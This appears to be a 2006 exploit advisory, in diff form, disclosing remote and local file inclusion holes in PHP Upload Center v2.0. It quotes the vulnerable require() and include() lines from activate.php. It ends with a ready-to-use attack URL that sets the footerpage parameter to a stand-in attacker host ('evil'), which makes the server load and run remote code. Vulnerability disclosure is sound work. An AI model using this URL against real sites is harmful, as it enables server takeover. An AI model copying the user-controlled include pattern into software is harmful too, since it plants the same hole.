@@ -1,0 +1,67 @@
+*************************************************************************************************************************
+                                                              					          		 
+			               			 Coding 4 Fun     						 
+			                                      						  		 
+*************************************************************************************************************************
+													  		 
+* Name = PHP Upload Center v2.0 ; 											 
+													  		 
+* Class = Remote/Local File Inclusion ;											 
+															 
+* Download = http://skrypty.webpc.pl/pobierz.php?id=58 ;				 			         
+													  		 
+* Found by = GregStar (gregstar[at]c4f[dot]pl) (http://c4f.pl) ;				          		 
+												  	  		 
+-------------------------------------------------------------------------------------------------------------------------
+													  		 
+Vulnerable Code in activate.php												 
+															 
+line 66-70														 
+															 
+...															 
+															 
+ if (!isset($language))													 
+  $language=$dft_language;												 
+if ($language=="")													 
+  $language=$dft_language;												 
+require("include/${language}.php"); <== Local incl.								 
+															 
+...															 
+	
+
+line 164
+
+...
+
+include($footerpage);  <== Remote incl.
+
+...
+
+
+Code in include/en.php (and other language files)
+
+line 5-7
+
+...
+
+$headerpage="include/header.htm";
+$footerpage="include/footer.htm"; <==
+$infopage="include/info.htm";
+
+...
+
+												  		 
+- Ex. :	
+
+  														 
+ http://[target]/[path]/activate.php?language=conf&footerpage=http://evil?								 
+															 
+															 
+															 
+															 
+*************************************************************************************************************************
+Gr33tz:  sASAn,marcel3miasto,masS,kaziq,Abi,kociaq,SlashBeast,chochlik,rfl,d3m0n,java,reyw,kw@ch.	  		 
+												          		 
+*************************************************************************************************************************
+
+# milw0rm.com [2006-12-03]
